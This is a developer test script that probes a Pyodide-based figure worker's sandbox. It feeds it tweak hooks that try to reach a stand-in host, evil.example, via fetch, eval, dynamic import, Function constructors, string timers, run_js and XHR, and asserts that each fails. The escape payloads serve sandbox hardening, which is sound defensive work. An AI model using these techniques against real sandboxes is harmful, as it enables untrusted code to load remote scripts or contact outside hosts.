// Dev-only: the figure worker's sandbox, probed directly (bypassing the
// client-side isCodeSafeToRun screen on purpose): tweaks that try every known
// way to reach the network — fetch, XHR, eval/Function/import(), string
// timers, run_js — must all fail with zero requests leaving, while a benign
// tweak still runs and renders/exports still work after the lock.
import { chromium } from "playwright";
import { readFileSync } from "node:fs";
const gallery = JSON.parse(readFileSync("public/figure-gallery/templates.json", "utf8"));
const csv = readFileSync("figurelib/samples/trial.csv", "utf8");
const scsv = readFileSync("figurelib/samples/survival.csv", "utf8");
const dt = (n) => Object.fromEntries(gallery.samples[n].map((c) => [c.name, c.dtype]));
const spec = gallery.templates.find((t) => t.id === "box").spec;
const km = gallery.templates.find((t) => t.id === "km").spec;
const browser = await chromium.launch();
const context = await browser.newContext();
const hits = [];
await context.route("**/evil.example/**", (r) => { hits.push(r.request().url()); r.fulfill({ status: 200, contentType: "text/javascript", body: "export default 1" }); });
const page = await context.newPage();
await page.goto("http://localhost:3000/privacy");
const hooks = [
  "import js\ndef customize(fig, axes, df):\n    js.fetch('https://evil.example/f')\n",
  "import js\ndef customize(fig, axes, df):\n    js.eval('import(\"https://evil.example/i.js\")')\n",
  "import js\ndef customize(fig, axes, df):\n    js.Function.new('return import(\"https://evil.example/fn.js\")')()\n",
  "import js\ndef customize(fig, axes, df):\n    js.Function('return import(\"https://evil.example/fn2.js\")')()\n",
  "import js\ndef customize(fig, axes, df):\n    ctor = js.Object.getPrototypeOf(js.Object.getPrototypeOf(js.fetch)).constructor\n    ctor('return import(\"https://evil.example/ctor.js\")')()\n",
  "import js\ndef customize(fig, axes, df):\n    js.setTimeout('import(\"https://evil.example/t.js\")', 0)\n",
  "from pyodide.code import run_js\ndef customize(fig, axes, df):\n    run_js('import(\"https://evil.example/runjs.js\")')\n",
  "import js\ndef customize(fig, axes, df):\n    js.XMLHttpRequest.new().open('GET','https://evil.example/x')\n",
  "def customize(fig, axes, df):\n    axes[0].set_title('SAFE')\n",
];
const out = await page.evaluate(async ({ hooks, csv, scsv, d1, d2, spec, km }) => {
  const w = new Worker("/figureWorker.mjs", { type: "module" });
  let id = 0;
  const call = (msg) => new Promise((res) => { const h = (e) => { if (e.data.id !== msg.id || e.data.type === "progress") return; w.removeEventListener("message", h); res(e.data); }; w.addEventListener("message", h); w.postMessage(msg); });
  const res = [];
  for (const hook of hooks) {
    const r = await call({ type: "render", id: ++id, spec, csv, dtypes: d1, formats: ["svg"], dpi: 72, hook });
    res.push(r.type + " | " + (r.hookWarning ?? r.code ?? "") + (r.code ? " " + (r.traceback || "").slice(0, 200) : "") + (r.images?.svg && atob(r.images.svg).includes("SAFE") ? " | SAFE drawn" : ""));
  }
  const ieee = { ...spec, style: "ieee", panels: [{ ...spec.panels[0], stats: { ...spec.panels[0].stats, test: "welch", pairs: "vs-first" } }] };
  let r = await call({ type: "render", id: ++id, spec: ieee, csv, dtypes: d1, formats: ["png", "tiff", "pdf", "svg"], dpi: 300, hook: null });
  res.push(`after lock ieee+welch export: ${r.type} ${r.code ?? r.meta.font}`);
  r = await call({ type: "render", id: ++id, spec: km, csv: scsv, dtypes: d2, formats: ["png"], dpi: 72, hook: null });
  res.push(`after lock km (new data): ${r.type} ${r.code ?? r.meta.panels[0].tests.length + " test"}`);
  return res;
}, { hooks, csv, scsv, d1: dt("trial"), d2: dt("survival"), spec, km });
await page.waitForTimeout(2000);
out.forEach((l) => console.log(l));
const escapes = out.slice(0, hooks.length - 1);
const ok =
  hits.length === 0 &&
  escapes.every((l) => l.startsWith("result | The custom tweak failed")) &&
  out[hooks.length - 1].includes("SAFE drawn") &&
  out.slice(hooks.length).every((l) => l.includes(": result "));
console.log("requests reaching evil.example:", hits.length, hits);
await browser.close();
console.log(ok ? "PASS" : "FAIL");
process.exit(ok ? 0 : 1);
